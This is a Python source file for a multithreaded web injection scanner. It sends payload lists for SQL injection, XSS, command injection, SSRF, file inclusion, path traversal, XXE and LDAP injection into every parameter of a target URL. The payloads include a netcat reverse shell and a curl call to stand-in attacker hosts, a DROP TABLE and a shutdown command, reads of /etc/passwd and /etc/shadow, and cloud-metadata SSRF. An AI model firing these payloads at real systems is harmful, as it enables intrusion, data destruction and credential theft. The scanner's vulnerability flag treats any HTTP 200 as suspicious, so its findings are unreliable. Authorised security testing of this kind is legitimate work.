from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.request import send_request

def penetration_test(
    url, method, payload, auth=None, max_workers=5,
    retry_on_fail=False, max_retries=2, verify_ssl=True, timeout=1000
):
    injection_vectors = {
        "SQL Injection": [
            "' OR '1'='1", "' UNION SELECT NULL--", "' OR 1=1--", "admin' --", "' OR x=x--",
            "' OR 'x'='x", "'; DROP TABLE users; --", "\" OR \"\" = \"", "' AND 1=0 UNION SELECT username, password FROM users --"
        ],
        "XSS": [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>", "<input onfocus=alert('XSS') autofocus>",
            "<div onclick=alert(1)>Click me</div>", "\"><script>alert(1)</script>",
            "'\"><svg onload=alert(1)>", "<math><mtext></mtext><annotation encoding='application/x-tex'>\\alert{XSS}</annotation></math>"
        ],
        "Command Injection": [
            "1; ls -la", "test && whoami", "test | id", "test; uname -a", "`id`", "$(whoami)",
            "& ping -c 1 attacker.com", "| nc -e /bin/sh attacker.com 4444",
            "; curl http://evil.com", "|| dir", "'; shutdown -h now; '"
        ],
        "SSRF": [
            "http://127.0.0.1", "http://127.0.0.1:80", "http://127.0.0.1:22", "http://localhost:8080",
            "http://169.254.169.254/latest/meta-data/", "http://[::1]:80/", "file:///etc/passwd",
            "gopher://127.0.0.1:11211/_stats", "http://internal-service.local",
            "http://example.com@169.254.169.254"
        ],
        "LFI": [
            "../../etc/passwd", "../../../../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
            "..\\..\\windows\\win.ini", "/etc/passwd%00", "/proc/self/environ",
            "../../../../../../../../boot.ini", "php://filter/convert.base64-encode/resource=index.php"
        ],
        "RFI": [
            "http://evil.com/shell.txt", "https://malicious.site/malware.php", "//attacker.com/code.txt",
            "http://example.com/evil.php", "ftp://evil.com/payload.txt",
            "data:text/html,<script>alert('RFI')</script>"
        ],
        "Path Traversal": [
            "../", "..\\", "%2e%2e%2f", "..%5c", "..%2f", "..%c0%af", "..%e0%80%af",
            "../../../../../../etc/shadow", "../../boot.ini", "..//..//..//..//..//..//windows/win.ini"
        ],
        "XXE": [
            "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://evil.com/malicious.dtd\"> %ext;]>",
            "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><test>&xxe;</test>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
        ],
        "LDAP Injection": [
            "*)(uid=*))(|(uid=*)", "admin*)(&)", "*)(&(objectClass=*))", "*)%00", "(&(userPassword=*))",
            "*(|(mail=*))", "*(objectclass=*)", "(|(cn=*))", "admin)(|(password=*))"
        ]
    }

    test_cases = []
    for category, injections in injection_vectors.items():
        for inj in injections:
            for key in payload:
                modified_payload = payload.copy()
                modified_payload[key] = inj
                test_cases.append((category, key, inj, modified_payload))


    def send_test(category, param_name, injection, test_payload):
        attempt = 0
        while attempt <= max_retries:
            resp, duration, text = send_request(
                method, url, test_payload, auth=auth,
                verify_ssl=verify_ssl, timeout=timeout
            )
            if hasattr(resp, 'status_code') or not retry_on_fail:
                break
            attempt += 1

        status = resp.status_code if hasattr(resp, 'status_code') else str(resp)
        suspicious_keywords = ["root", "<script", "onerror", "uid=", "admin", "127.0.0.1", "ec2"]
        suspicious = (
            status == 200 or
            (hasattr(resp, 'text') and any(x in text.lower() for x in suspicious_keywords))
        )
        flag = "✅ Potential Vulnerability" if suspicious else "❌ Likely Safe"

        return {
            "category": category,
            "parameter": param_name,
            "injection": injection,
            "payload": test_payload,
            "status_code": status,
            "time": duration,
            "response": text,
            "flag": flag
        }


    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(send_test, cat, key, inj, p): i
            for i, (cat, key, inj, p) in enumerate(test_cases)
        }
        for future in as_completed(futures):
            results.append(future.result())

    return results
